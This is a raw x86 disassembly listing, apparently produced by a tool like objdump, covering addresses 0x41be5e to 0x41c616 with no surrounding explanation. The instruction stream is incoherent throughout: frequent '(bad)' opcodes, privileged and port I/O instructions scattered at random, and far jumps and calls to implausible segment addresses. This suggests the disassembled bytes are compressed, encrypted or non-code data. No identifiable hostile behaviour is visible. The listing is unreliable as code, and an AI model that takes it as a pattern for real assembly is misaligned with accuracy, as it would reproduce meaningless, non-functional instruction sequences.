  41be5e:	scas   al,BYTE PTR es:[edi]
  41be5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be60:	outs   dx,DWORD PTR ds:[esi]
  41be61:	adc    esi,DWORD PTR [edi-0x725f000d]
  41be67:	(bad)  
  41be68:	xchg   esp,eax
  41be69:	mov    ebx,0x497b9942
  41be6e:	test   ebx,esp
  41be70:	inc    ecx
  41be71:	sbb    edi,DWORD PTR [esp+eiz*4-0x7c3c7717]
  41be78:	vpaddq xmm2,xmm2,XMMWORD PTR [ecx+0x172b785b]
  41be80:	es icebp 
  41be82:	mov    dl,0x38
  41be84:	pusha  
  41be85:	sub    al,0xf8
  41be87:	or     ch,dl
  41be89:	lahf   
  41be8a:	gs xchg ecx,eax
  41be8c:	ds iret 
  41be8e:	jne    0x41be3c
  41be90:	inc    edi
  41be91:	push   0x78
  41be93:	sub    ah,dh
  41be95:	xlat   BYTE PTR ds:[ebx]
  41be96:	mov    esp,0xe4c2fea2
  41be9b:	pop    ss
  41be9c:	or     DWORD PTR [esi],edx
  41be9e:	mov    ecx,0x2c7f6249
  41bea3:	shr    esp,0xbc
  41bea6:	in     eax,dx
  41bea7:	push   esi
  41bea8:	es jns 0x41be56
  41beab:	add    DWORD PTR [ebx-0xadc063d],eax
  41beb1:	(bad)  
  41beb2:	call   0x2d0c:0xf1c821d
  41beb9:	test   BYTE PTR [esi-0x1d],0x73
  41bebd:	add    eax,0xd0e15e02
  41bec2:	cli    
  41bec3:	xor    eax,esp
  41bec5:	sub    BYTE PTR [edx],dl
  41bec7:	xchg   ebx,eax
  41bec8:	jmp    0xfaef:0x7633e3d8
  41becf:	adc    ebp,DWORD PTR [eax+0x62b6a8bc]
  41bed5:	push   ecx
  41bed6:	stos   BYTE PTR es:[edi],al
  41bed7:	sbb    esp,0xffffff8d
  41beda:	sahf   
  41bedb:	sub    al,0xf5
  41bedd:	and    eax,0xea4f9710
  41bee2:	push   ss
  41bee3:	xchg   esi,eax
  41bee4:	push   es
  41bee5:	mov    dh,0xbc
  41bee7:	push   eax
  41bee8:	fs fcomip st,st(3)
  41beeb:	push   edx
  41beec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41beed:	push   ds
  41beee:	and    BYTE PTR [ebx],0x12
  41bef1:	fst    DWORD PTR [ebp+0x33]
  41bef4:	jecxz  0x41be97
  41bef6:	cmc    
  41bef7:	push   0x1c56a089
  41befc:	(bad)  
  41befd:	popa   
  41befe:	xor    ecx,0xffffffaf
  41bf01:	xchg   edi,eax
  41bf02:	in     al,dx
  41bf03:	ret    0xeb54
  41bf06:	jge    0x41bf53
  41bf08:	jg     0x41bf11
  41bf0a:	je     0x41bf31
  41bf0c:	jle    0x41bf60
  41bf0e:	or     esp,DWORD PTR [ebx-0x6b4b1a2d]
  41bf14:	into   
  41bf15:	cmp    BYTE PTR [edx+0x1b],cl
  41bf18:	dec    esi
  41bf19:	adc    al,BYTE PTR [ecx]
  41bf1b:	mov    edi,0x28b2c3d6
  41bf20:	jmp    DWORD PTR [eax+edi*4+0x71477253]
  41bf27:	(bad)  
  41bf28:	sub    esp,DWORD PTR [ebp-0x5c]
  41bf2b:	cmovnp edx,DWORD PTR [eax+0x78]
  41bf2f:	stos   DWORD PTR es:[edi],eax
  41bf30:	push   ecx
  41bf31:	xor    al,0x5f
  41bf33:	mov    eax,0xd82f2553
  41bf38:	into   
  41bf39:	xor    edi,0x16171f4f
  41bf3f:	pop    ebx
  41bf40:	aam    0x5a
  41bf42:	xor    BYTE PTR [ebx+ebp*4],dh
  41bf45:	daa    
  41bf46:	call   0x49a2cda1
  41bf4b:	sub    al,0x60
  41bf4d:	xchg   bl,al
  41bf4f:	enter  0xfc70,0x48
  41bf53:	add    DWORD PTR [edx],0xffffffc7
  41bf56:	jle    0x41bf55
  41bf58:	sahf   
  41bf59:	mov    bl,0xf1
  41bf5b:	pop    ebx
  41bf5c:	nop
  41bf5d:	push   ds
  41bf5e:	adc    bl,BYTE PTR [esi-0x1b]
  41bf61:	or     al,0x1
  41bf63:	dec    esi
  41bf64:	lods   al,BYTE PTR ds:[esi]
  41bf65:	dec    esi
  41bf66:	or     DWORD PTR [edx+0x211d905b],edi
  41bf6c:	sbb    eax,0x3551f119
  41bf71:	xchg   esi,eax
  41bf72:	mov    ebx,0x86f6b0c1
  41bf77:	add    cl,BYTE PTR [edi]
  41bf79:	ss mov ebx,0x505f209
  41bf7f:	jo     0x41bfe0
  41bf81:	stc    
  41bf82:	ins    DWORD PTR es:[edi],dx
  41bf83:	and    esi,DWORD PTR [edi-0x1d]
  41bf86:	jns    0x41c005
  41bf88:	fiadd  DWORD PTR [esi+0xf255e4b]
  41bf8e:	xlat   BYTE PTR ds:[ebx]
  41bf8f:	(bad)  
  41bf90:	imul   ebp,DWORD PTR [ebx],0x9d77b24f
  41bf96:	enter  0x5d9,0x41
  41bf9a:	fwait
  41bf9b:	xadd   bl,bh
  41bf9e:	inc    ebx
  41bf9f:	mov    eax,0x3bbff23a
  41bfa4:	push   cs
  41bfa5:	and    DWORD PTR [eax+0x10],eax
  41bfa8:	and    ebx,edx
  41bfaa:	jbe    0x41c019
  41bfac:	mov    al,0xdc
  41bfae:	leave  
  41bfaf:	dec    eax
  41bfb0:	pusha  
  41bfb1:	das    
  41bfb2:	adc    ebp,DWORD PTR [ebx+0x25]
  41bfb5:	lock xchg ecx,eax
  41bfb7:	and    cl,0xdf
  41bfba:	cmp    al,0x60
  41bfbc:	add    BYTE PTR [esp+ebp*1-0x7ec5789],al
  41bfc3:	pop    ebx
  41bfc4:	jmp    0x2c762cd4
  41bfc9:	lea    ebp,[ebx]
  41bfcb:	jmp    0x41bf80
  41bfcd:	mov    ds:0xcc332849,al
  41bfd2:	xchg   edx,eax
  41bfd3:	or     ecx,0xffffffef
  41bfd6:	mov    edx,0xdb748a98
  41bfdb:	mov    dh,0x23
  41bfdd:	(bad)  
  41bfde:	and    DWORD PTR [edx+0x6c84a34],eax
  41bfe4:	push   0x9b61cf5a
  41bfe9:	add    esi,DWORD PTR ds:0x3e2a1cbe
  41bfef:	jge    0x41c011
  41bff1:	ret    0x8234
  41bff4:	push   cs
  41bff5:	aam    0x49
  41bff7:	add    ah,BYTE PTR [eiz*2-0x25f5da78]
  41bffe:	cmp    al,dh
  41c000:	pop    ebx
  41c001:	ds push es
  41c003:	rcr    BYTE PTR [bx],cl
  41c006:	in     eax,0x9f
  41c008:	(bad)  
  41c009:	shl    DWORD PTR [ecx],1
  41c00b:	push   0xcc2c5f9c
  41c010:	dec    eax
  41c011:	fisttp DWORD PTR [edx]
  41c013:	sub    cl,BYTE PTR gs:[edi+0x57]
  41c017:	adc    eax,0xffc17538
  41c01c:	add    eax,0xaff5b687
  41c021:	repnz stc 
  41c023:	adc    al,0xd7
  41c025:	nop
  41c026:	aaa    
  41c027:	xchg   BYTE PTR [ecx+eiz*8],dh
  41c02a:	pusha  
  41c02b:	sbb    DWORD PTR [eax],esi
  41c02d:	jb     0x41c085
  41c02f:	clc    
  41c030:	fadd   DWORD PTR [ebx+0x76423be7]
  41c036:	mov    DWORD PTR ds:0x6c08cc59,ecx
  41c03c:	or     eax,0x97e9f3a1
  41c041:	dec    ebx
  41c042:	sub    eax,esi
  41c044:	sub    eax,0x3c7ee72f
  41c049:	jae    0x41c055
  41c04b:	leave  
  41c04c:	adc    edx,ebp
  41c04e:	sub    ch,BYTE PTR [ebx+0x69]
  41c051:	je     0x41c0b1
  41c053:	add    al,0xdb
  41c055:	xchg   ebp,eax
  41c056:	or     ecx,edx
  41c058:	xor    eax,DWORD PTR [eax+0x5d452046]
  41c05e:	xchg   ebp,eax
  41c05f:	sbb    eax,0x567e655d
  41c064:	jno    0x41c05b
  41c066:	jb     0x41c03f
  41c068:	loopne 0x41c045
  41c06a:	pop    ds
  41c06b:	mov    ds:0xd82da6e2,al
  41c070:	repz push ebp
  41c072:	pushf  
  41c073:	dec    esi
  41c075:	mov    al,ds:0x729d600a
  41c07a:	inc    ecx
  41c07b:	clc    
  41c07c:	shl    BYTE PTR [edx+0x3be8f90c],0x2c
  41c083:	push   ds
  41c084:	fist   WORD PTR [edx-0x5e]
  41c087:	add    DWORD PTR [edi-0x6a],0xaf48da66
  41c08e:	sahf   
  41c08f:	stos   DWORD PTR es:[edi],eax
  41c090:	xor    bl,BYTE PTR [ebp-0x3c8533ff]
  41c096:	adc    ebx,DWORD PTR [ebx-0x2e]
  41c099:	outs   dx,BYTE PTR ds:[esi]
  41c09a:	lahf   
  41c09b:	xchg   dh,ch
  41c09d:	adc    BYTE PTR [esi-0x342e229b],al
  41c0a3:	mov    ds:0xe83c3f95,al
  41c0a8:	mov    WORD PTR [ebx-0x6f6d2665],ds
  41c0ae:	sar    edi,1
  41c0b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0b1:	cs fst st(4)
  41c0b4:	test   al,0xa3
  41c0b6:	pusha  
  41c0b7:	jo     0x41c050
  41c0b9:	popf   
  41c0ba:	sbb    esp,ebp
  41c0bc:	xor    DWORD PTR ds:0x38d21eac,edx
  41c0c2:	in     eax,dx
  41c0c3:	xchg   ebp,eax
  41c0c4:	adc    al,0x79
  41c0c6:	(bad)  
  41c0c7:	loope  0x41c0c0
  41c0c9:	add    eax,0xaabd0a0
  41c0ce:	popa   
  41c0cf:	inc    esi
  41c0d0:	fdiv   QWORD PTR [edi-0x4f52dc9e]
  41c0d6:	loopne 0x41c112
  41c0d8:	pop    esp
  41c0d9:	ss stos DWORD PTR es:[edi],eax
  41c0db:	div    DWORD PTR [esi+edx*8-0x72e5f558]
  41c0e2:	sub    al,0x5f
  41c0e4:	add    ebp,DWORD PTR [edi-0x31]
  41c0e7:	xchg   DWORD PTR [esi-0x5443b82],eax
  41c0ed:	mov    al,0x23
  41c0ef:	inc    ebx
  41c0f0:	or     eax,DWORD PTR [ecx-0x65]
  41c0f3:	and    eax,edx
  41c0f5:	or     al,0xbf
  41c0f7:	xchg   BYTE PTR [edi],cl
  41c0f9:	fstp   QWORD PTR [edi-0x19]
  41c0fc:	jae    0x41c0d0
  41c0fe:	retf   
  41c0ff:	pop    eax
  41c100:	and    bl,BYTE PTR [ebx-0x4e0307ef]
  41c106:	push   eax
  41c107:	adc    dl,cl
  41c109:	push   eax
  41c10a:	popa   
  41c10b:	push   esi
  41c10c:	mov    eax,ds:0x50cdd8c8
  41c111:	sbb    eax,0x44f5ba2a
  41c116:	lock pop edx
  41c118:	push   ss
  41c119:	xchg   DWORD PTR [eax-0x73],esp
  41c11c:	or     DWORD PTR [eax-0x7b],0xc01891c5
  41c123:	out    dx,eax
  41c124:	cmp    BYTE PTR [edi],0xd9
  41c127:	push   ebp
  41c128:	jb     0x41c19b
  41c12a:	inc    ecx
  41c12b:	imul   esi,DWORD PTR [esi-0x75ae1f9e],0xffffffa0
  41c132:	dec    eax
  41c133:	sbb    eax,0xb0aac1b3
  41c138:	arpl   WORD PTR [ebx-0x1266d4fd],si
  41c13e:	es test ch,al
  41c141:	in     eax,dx
  41c142:	or     BYTE PTR [ebx+0x4],0xa9
  41c146:	xor    BYTE PTR [esi+0x3978417b],ch
  41c14c:	retw   0xb89
  41c150:	ds pop ebx
  41c152:	xor    eax,0x783bf6d3
  41c157:	hlt    
  41c158:	lods   eax,DWORD PTR ds:[esi]
  41c159:	(bad)  
  41c15a:	loope  0x41c0dc
  41c15c:	je     0x41c18a
  41c15e:	sub    bh,bl
  41c160:	fwait
  41c161:	cdq    
  41c162:	xchg   ebx,eax
  41c163:	mov    ebx,0xeab9977c
  41c168:	jp     0x41c1c7
  41c16a:	out    0x0,al
  41c16c:	jnp    0x41c1ce
  41c16e:	sub    ebp,DWORD PTR [ebp+0x68]
  41c171:	or     ah,bl
  41c173:	es pop esi
  41c175:	add    eax,0xa191b6de
  41c17a:	mov    ah,0xed
  41c17c:	(bad)  [edx+0x17]
  41c17f:	xor    eax,DWORD PTR [edx+0x49196bfc]
  41c185:	adc    BYTE PTR [edx-0xe],cl
  41c188:	arpl   WORD PTR [ebx-0x72],si
  41c18b:	mov    eax,ds:0x5513d15d
  41c190:	mov    eax,0x77a86e7f
  41c195:	mov    cl,0xb6
  41c197:	in     eax,dx
  41c198:	xor    DWORD PTR [edx+0x7],ebx
  41c19b:	jae    0x41c199
  41c19d:	(bad)  
  41c19e:	mov    dl,0xe0
  41c1a0:	sbb    bl,ch
  41c1a2:	push   esi
  41c1a3:	sbb    BYTE PTR [ebx-0x55cac4cd],dh
  41c1a9:	sbb    al,0x8d
  41c1ab:	ds dec ebx
  41c1ad:	aas    
  41c1ae:	sahf   
  41c1af:	cwde   
  41c1b0:	bound  edi,QWORD PTR [edx]
  41c1b2:	rcr    BYTE PTR [ebx],cl
  41c1b4:	in     eax,0x17
  41c1b6:	call   0xff28e4c5
  41c1bb:	mov    esp,0x18096830
  41c1c0:	test   eax,0xe448aa27
  41c1c5:	sub    BYTE PTR [edi+0x149dc96e],dh
  41c1cb:	gs sbb dh,ah
  41c1ce:	add    DWORD PTR [ebx+0x1f],ebx
  41c1d1:	leave  
  41c1d2:	mov    edx,0x6d9d35ff
  41c1d7:	add    eax,0x4f5f5d82
  41c1dc:	iret   
  41c1dd:	xor    bl,al
  41c1df:	out    0xc2,al
  41c1e1:	pop    ebp
  41c1e2:	aad    0xa8
  41c1e4:	push   ebp
  41c1e5:	push   ebp
  41c1e6:	jne    0x41c18a
  41c1e8:	fiadd  WORD PTR [ebp+0xf]
  41c1eb:	pop    eax
  41c1ec:	call   0xda9ef1d7
  41c1f1:	and    BYTE PTR [eax-0x18342b4b],al
  41c1f7:	fistp  WORD PTR [edi-0x38]
  41c1fa:	push   cs
  41c1fb:	sub    BYTE PTR [edx+edi*2],ah
  41c1fe:	repz jae 0x41c236
  41c201:	fwait
  41c202:	repnz rcr ebp,1
  41c205:	call   0xc9c212a0
  41c20a:	lods   eax,DWORD PTR ds:[esi]
  41c20b:	imul   esi,DWORD PTR [edi],0xffffffe5
  41c20e:	(bad)
  41c211:	test   al,0xc8
  41c213:	mov    esp,0x6831f9b1
  41c218:	push   es
  41c219:	xchg   esi,eax
  41c21a:	pop    esi
  41c21b:	mov    al,ds:0x14e915fe
  41c220:	fist   DWORD PTR [edi]
  41c222:	fisub  DWORD PTR [esi-0x55f5df7e]
  41c228:	jmp    0xcd14:0xdde0059
  41c22f:	xchg   esi,eax
  41c230:	rol    DWORD PTR [edx],cl
  41c232:	jbe    0x41c262
  41c234:	repz mov ecx,0x90a8477a
  41c23a:	jae    0x41c247
  41c23c:	in     eax,dx
  41c23d:	sbb    DWORD PTR [ebx],ebp
  41c23f:	mov    ecx,0xb90900c4
  41c244:	test   ebx,esi
  41c246:	icebp  
  41c247:	test   DWORD PTR [edi+edi*4],esp
  41c24a:	pusha  
  41c24b:	hlt    
  41c24c:	pop    ebx
  41c24d:	sti    
  41c24e:	in     eax,dx
  41c24f:	lahf   
  41c250:	aam    0xcb
  41c252:	add    cl,BYTE PTR [eax+0x4b95ddaa]
  41c258:	sbb    DWORD PTR [eax+0x1],esi
  41c25b:	cmp    BYTE PTR [edx],bl
  41c25d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c25e:	mov    ds:0x65e1f2fc,eax
  41c263:	ficom  WORD PTR [ebp+eax*4-0x54]
  41c267:	xor    ah,BYTE PTR [ecx*4+0x4bbdf2fe]
  41c26e:	std    
  41c26f:	inc    ecx
  41c270:	add    eax,0xbfc4b33e
  41c275:	pop    ds
  41c276:	mov    cl,0x83
  41c278:	in     eax,0x4a
  41c27a:	and    BYTE PTR [edx+eiz*1+0x545064e9],ah
  41c281:	cdq    
  41c282:	mov    bl,0x12
  41c284:	or     BYTE PTR [eax+0x5019fe10],ah
  41c28a:	mov    bl,0xa2
  41c28c:	je     0x41c256
  41c28e:	ss jge 0x41c290
  41c291:	loopne 0x41c25b
  41c293:	push   esp
  41c294:	push   esp
  41c295:	or     edi,esi
  41c297:	xchg   ebx,eax
  41c298:	lods   eax,DWORD PTR ds:[esi]
  41c299:	test   eax,0x1e3fe9a5
  41c29e:	icebp  
  41c29f:	cmp    al,0x6
  41c2a1:	aaa    
  41c2a2:	enter  0x8acc,0x8d
  41c2a6:	dec    ebx
  41c2a7:	cmp    cl,BYTE PTR [edx-0x32839ad7]
  41c2ad:	sbb    dh,0xe4
  41c2b0:	shl    ebp,1
  41c2b2:	sub    BYTE PTR [esi],0xef
  41c2b5:	xchg   esp,eax
  41c2b6:	jge    0x41c2ac
  41c2b8:	pop    es
  41c2b9:	cwde   
  41c2ba:	sub    esi,DWORD PTR [eax+0x64e5c9f9]
  41c2c0:	dec    eax
  41c2c1:	jmp    0x97d3b3dd
  41c2c6:	fild   DWORD PTR [ebp+0x68f42e8]
  41c2cc:	(bad)  
  41c2cd:	(bad)  
  41c2ce:	and    al,0xf8
  41c2d0:	add    al,0x80
  41c2d2:	pinsrw mm6,esp,0x4c
  41c2d6:	push   es
  41c2d7:	outs   dx,DWORD PTR ds:[esi]
  41c2d8:	data16 fimul WORD PTR [edx+ecx*1+0x1d]
  41c2dd:	dec    ecx
  41c2de:	test   eax,0x642212fa
  41c2e3:	dec    ebx
  41c2e4:	scas   eax,DWORD PTR es:[edi]
  41c2e5:	push   eax
  41c2e6:	out    0xca,eax
  41c2e8:	mov    eax,0xfcc8ca3b
  41c2ed:	dec    ebx
  41c2ee:	ins    DWORD PTR es:[edi],dx
  41c2ef:	jmp    ecx
  41c2f1:	aaa    
  41c2f2:	or     ebp,eax
  41c2f4:	push   edx
  41c2f5:	sub    DWORD PTR [esi-0x29],esp
  41c2f8:	or     al,0xe8
  41c2fa:	push   es
  41c2fb:	lods   eax,DWORD PTR ds:[esi]
  41c2fc:	fidiv  WORD PTR [eax+0x1d]
  41c2ff:	add    bh,bh
  41c301:	shr    BYTE PTR [esi+0x7f5d4d83],0x9d
  41c308:	mov    BYTE PTR [ecx],dl
  41c30a:	and    esp,DWORD PTR [ebx]
  41c30c:	retf   
  41c30d:	add    bl,BYTE PTR [esi-0x40]
  41c310:	inc    edx
  41c311:	cmp    al,0x38
  41c313:	xor    ch,BYTE PTR [edx+0x4]
  41c316:	stc    
  41c317:	jl     0x41c36c
  41c319:	push   es
  41c31a:	nop
  41c31b:	sti    
  41c31c:	mov    edi,0xe2b41c66
  41c321:	sar    DWORD PTR [edx-0x47],cl
  41c324:	hlt    
  41c325:	jnp    0x41c2ca
  41c327:	test   BYTE PTR [esi+eiz*2],bh
  41c32a:	mov    ecx,0x3ea59cf6
  41c32f:	mov    esp,0xa4577f04
  41c334:	sbb    bl,BYTE PTR [ebp-0x5e]
  41c337:	sub    BYTE PTR [edx+0x6fe9be2b],0x4a
  41c33e:	mov    ebx,fs
  41c340:	sbb    BYTE PTR [ecx],ah
  41c342:	shl    eax,1
  41c344:	jae    0x41c397
  41c346:	popf   
  41c347:	push   ds
  41c348:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c349:	or     eax,0x38fa46d6
  41c34e:	mov    ebx,0xb7b55528
  41c353:	cmp    DWORD PTR [ecx],edx
  41c355:	daa    
  41c356:	iret   
  41c357:	(bad)  
  41c358:	bound  esp,QWORD PTR [ecx+0x45]
  41c35b:	mov    eax,DWORD PTR ds:0x173c744f
  41c361:	and    al,0xaa
  41c363:	(bad)  
  41c364:	fisub  DWORD PTR [ebx]
  41c366:	fst    DWORD PTR [edx+0x6b09de36]
  41c36c:	lods   al,BYTE PTR ds:[esi]
  41c36d:	and    eax,0xfdc073a
  41c372:	jmp    0x7eb4e4ae
  41c377:	fist   DWORD PTR [edi-0x23939e98]
  41c37d:	pushf  
  41c37e:	pop    eax
  41c37f:	sub    al,0x63
  41c381:	mov    ebx,0xa1a83225
  41c386:	arpl   WORD PTR [edx-0x19377dd6],dx
  41c38c:	dec    edx
  41c38d:	nop
  41c38e:	dec    eax
  41c38f:	mov    ebx,0xfee13bba
  41c394:	idiv   BYTE PTR ds:0x98137461
  41c39a:	pop    esp
  41c39b:	(bad)  
  41c39c:	push   esp
  41c39d:	imul   eax,DWORD PTR [esi-0x20],0x7403d200
  41c3a4:	das    
  41c3a5:	cmp    al,0xf8
  41c3a7:	or     BYTE PTR [esi],dl
  41c3a9:	jae    0x41c3c3
  41c3ab:	push   ecx
  41c3ac:	pusha  
  41c3ad:	cdq    
  41c3ae:	sbb    DWORD PTR [ebx],ecx
  41c3b0:	mov    eax,0xac425884
  41c3b5:	in     al,0xcc
  41c3b7:	mov    ebx,0x38bf8ab4
  41c3bc:	aam    0xd1
  41c3be:	shl    DWORD PTR [ecx],cl
  41c3c0:	push   0x30
  41c3c2:	adc    dl,BYTE PTR [edi+0x7c]
  41c3c5:	mov    ecx,0xb545d247
  41c3ca:	sar    DWORD PTR [ebp+0x16b4d34e],0xd8
  41c3d1:	xchg   ebp,eax
  41c3d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3d3:	mov    bl,0xc9
  41c3d5:	outs   dx,BYTE PTR ds:[esi]
  41c3d6:	add    eax,0xeff4fe36
  41c3db:	mov    bl,0xd2
  41c3dd:	out    0x5c,eax
  41c3df:	and    BYTE PTR [esi+eiz*4-0x2420d771],ah
  41c3e6:	inc    eax
  41c3e7:	in     eax,dx
  41c3e8:	retf   
  41c3e9:	hlt    
  41c3ea:	dec    edi
  41c3eb:	call   0xadce:0xccaa936
  41c3f2:	and    al,0xc6
  41c3f4:	mov    esp,0x3baf1ef5
  41c3f9:	lahf   
  41c3fa:	push   ds
  41c3fb:	and    al,0x9e
  41c3fd:	clc    
  41c3fe:	pop    ecx
  41c3ff:	adc    DWORD PTR [ebx],eax
  41c401:	iret   
  41c402:	xchg   esi,eax
  41c403:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c404:	and    ebx,DWORD PTR [ebx+0x7c]
  41c407:	mov    eax,ds:0xb2bb6171
  41c40c:	(bad)  
  41c40d:	fdivr  DWORD PTR ss:0x309341c4
  41c414:	lods   eax,DWORD PTR ds:[esi]
  41c415:	sub    DWORD PTR [eax],ebp
  41c417:	mov    esp,0x38c5f400
  41c41c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c41d:	mov    ds:0x77c818f3,eax
  41c422:	aas    
  41c423:	retf   0xfc59
  41c426:	jmp    0x41c45f
  41c428:	mov    ds:0x1bcb002d,al
  41c42d:	adc    al,0x67
  41c42f:	loop   0x41c3ce
  41c431:	cld    
  41c432:	xor    eax,0xb40f1cce
  41c437:	dec    ecx
  41c438:	enter  0x9686,0x50
  41c43c:	sti    
  41c43d:	adc    BYTE PTR [ecx],cl
  41c43f:	mov    dh,0x61
  41c441:	mov    ebp,0xc0a1335f
  41c446:	ret    0xf3a5
  41c449:	sub    esi,edx
  41c44b:	out    0x5c,al
  41c44d:	pop    esi
  41c44e:	loope  0x41c461
  41c450:	inc    esp
  41c451:	xchg   DWORD PTR [edx],edx
  41c453:	inc    esi
  41c454:	ss pusha 
  41c456:	jbe    0x41c47a
  41c458:	pop    ebx
  41c459:	push   edi
  41c45a:	jl     0x41c3e1
  41c45c:	push   ss
  41c45d:	mov    esi,eax
  41c45f:	push   es
  41c460:	jae    0x41c45f
  41c462:	out    dx,eax
  41c463:	inc    DWORD PTR [eax]
  41c465:	adc    DWORD PTR [ecx-0x62b13c71],esp
  41c46b:	neg    ebp
  41c46d:	(bad)  [ebx]
  41c46f:	mov    ah,0x7f
  41c471:	cmc    
  41c472:	(bad)  
  41c473:	(bad)  
  41c474:	xor    BYTE PTR [edx],ah
  41c476:	pop    DWORD PTR [edx+0x7e7f7c02]
  41c47c:	call   0xf3c4:0x107f98f4
  41c483:	iret   
  41c484:	cs mov bh,0x44
  41c487:	lods   al,BYTE PTR ds:[esi]
  41c488:	jae    0x41c4b5
  41c48a:	aaa    
  41c48b:	push   ebp
  41c48c:	dec    ebx
  41c48d:	mov    edi,0x99abf080
  41c492:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c493:	mov    ecx,0xf8da6949
  41c498:	pop    eax
  41c499:	pop    esp
  41c49a:	mov    ecx,0xd6a213ea
  41c49f:	loope  0x41c422
  41c4a1:	mov    al,BYTE PTR [esi+0x57]
  41c4a4:	pop    ecx
  41c4a5:	adc    al,0xba
  41c4a7:	pop    esp
  41c4a8:	(bad)
  41c4ab:	fst    QWORD PTR [esi-0xf174e5f]
  41c4b1:	(bad)  
  41c4b2:	sub    edi,DWORD PTR [esi]
  41c4b4:	fsubr  DWORD PTR ds:[ebp+0x7a4a071c]
  41c4bb:	jle    0x41c4c8
  41c4bd:	mov    ecx,0x80a9f2da
  41c4c2:	mov    BYTE PTR [edi],bh
  41c4c4:	imul   edi,ebp,0xffffffcb
  41c4c7:	fnsave [ebx-0x3eca4430]
  41c4cd:	aad    0x81
  41c4cf:	xchg   ecx,eax
  41c4d0:	dec    ebx
  41c4d1:	push   0x5b
  41c4d3:	(bad)  
  41c4d5:	out    0x23,al
  41c4d7:	and    edi,DWORD PTR ds:0x33e2d1b9
  41c4de:	aas    
  41c4df:	push   ebp
  41c4e0:	xor    al,0xf7
  41c4e2:	test   al,0x57
  41c4e4:	xchg   BYTE PTR [edi-0x46],ah
  41c4e7:	ss inc eax
  41c4e9:	jns    0x41c4b4
  41c4eb:	nop
  41c4ec:	sub    al,BYTE PTR [ebp+0x3f09daec]
  41c4f2:	pop    esp
  41c4f3:	fbld   TBYTE PTR [ecx]
  41c4f5:	repnz and ax,0xdf74
  41c4fa:	out    dx,al
  41c4fb:	repz xor al,0x12
  41c4fe:	cmp    eax,0xc429ef24
  41c503:	enter  0x632d,0x9a
  41c507:	in     al,0xd4
  41c509:	mov    ebp,edx
  41c50b:	or     BYTE PTR [edi],0xa6
  41c50e:	ds inc esp
  41c510:	push   es
  41c511:	iret   
  41c512:	dec    esi
  41c513:	and    ch,al
  41c515:	cmp    esi,eax
  41c517:	xor    eax,0xcdf4287e
  41c51c:	enter  0x91c2,0x65
  41c520:	push   0x31
  41c522:	les    ebp,FWORD PTR [edx+0x20e6d6b7]
  41c528:	leave  
  41c529:	je     0x41c4ed
  41c52b:	jge    0x41c50f
  41c52d:	dec    edi
  41c52e:	scas   al,BYTE PTR es:[edi]
  41c52f:	pop    es
  41c530:	mov    esp,0xd2f532e5
  41c535:	dec    ebp
  41c536:	adc    al,0x6d
  41c538:	in     al,0x13
  41c53a:	mov    ecx,0x2a96a1eb
  41c53f:	fadd   QWORD PTR [eax-0x6303b095]
  41c545:	pop    esp
  41c546:	ja     0x41c593
  41c548:	mov    WORD PTR [ebx+0x23],?
  41c54b:	fs or  al,0xdf
  41c54e:	mov    esi,0xaedd365a
  41c553:	test   eax,0xe07c71df
  41c558:	and    al,0x79
  41c55a:	test   BYTE PTR [edi+0x76f6798e],bh
  41c560:	das    
  41c561:	add    al,0x3a
  41c563:	sbb    eax,DWORD PTR [esp+ebx*1+0x277be2ca]
  41c56a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c56b:	fld    TBYTE PTR [edi]
  41c56d:	out    dx,eax
  41c56e:	inc    eax
  41c56f:	inc    edi
  41c570:	push   eax
  41c571:	pop    edi
  41c572:	cdq    
  41c573:	test   eax,0xb2d4e5e6
  41c578:	or     bl,BYTE PTR [edx-0x6]
  41c57b:	mov    al,ds:0x6edd5b15
  41c580:	sbb    ah,BYTE PTR [eax+0x4a]
  41c583:	mov    edi,0x299d4393
  41c588:	pop    esp
  41c589:	inc    eax
  41c58a:	pop    ecx
  41c58b:	rol    eax,cl
  41c58d:	push   0x808cc8d7
  41c592:	(bad)  
  41c593:	out    dx,al
  41c594:	xchg   edx,eax
  41c595:	inc    ebx
  41c596:	aas    
  41c597:	in     al,dx
  41c598:	fldenv [esi]
  41c59a:	xor    eax,0x1da6e818
  41c59f:	sar    DWORD PTR [esi-0x1b16a200],0xd3
  41c5a6:	adc    eax,edx
  41c5a8:	cmp    ah,ah
  41c5aa:	adc    eax,0x369db168
  41c5af:	or     eax,0x8ffe2dca
  41c5b4:	cwde   
  41c5b5:	loope  0x41c561
  41c5b7:	dec    edx
  41c5b8:	sbb    eax,0x94731eec
  41c5bd:	(bad)  
  41c5bf:	pop    ecx
  41c5c0:	(bad)  
  41c5c1:	and    eax,0xdf400c3b
  41c5c6:	or     eax,0x3fc4f2ce
  41c5cb:	jbe    0x41c5a7
  41c5cd:	lahf   
  41c5ce:	push   0x8e48bc65
  41c5d3:	retf   0x86fa
  41c5d6:	sub    eax,0xa35c8f98
  41c5db:	mov    ah,0x77
  41c5dd:	cld    
  41c5de:	fsubr  DWORD PTR ss:[eax]
  41c5e1:	retf   0xfc5d
  41c5e4:	lods   eax,DWORD PTR ds:[esi]
  41c5e5:	data16 (bad) 
  41c5e7:	dec    ebx
  41c5e8:	frstor [ebx-0x34]
  41c5eb:	les    edx,FWORD PTR [ebx]
  41c5ed:	jo     0x41c5e0
  41c5ef:	(bad)  
  41c5f0:	sbb    al,0xc4
  41c5f2:	shl    DWORD PTR [ecx],1
  41c5f4:	and    al,0xd4
  41c5f6:	or     eax,edx
  41c5f8:	mov    DWORD PTR [edx],edi
  41c5fa:	loope  0x41c604
  41c5fc:	loop   0x41c5a9
  41c5fe:	xchg   edi,eax
  41c5ff:	fcomp  DWORD PTR [eax]
  41c601:	jns    0x41c643
  41c603:	out    0xd7,eax
  41c605:	pop    ebx
  41c606:	xchg   ebx,eax
  41c607:	push   ebp
  41c608:	jno    0x41c651
  41c60a:	enter  0x789c,0x3
  41c60e:	jae    0x41c5e8
  41c610:	xchg   edx,eax
  41c611:	sar    DWORD PTR [ecx+esi*1+0x5d],0xf9
  41c616:	sbb    bl,al
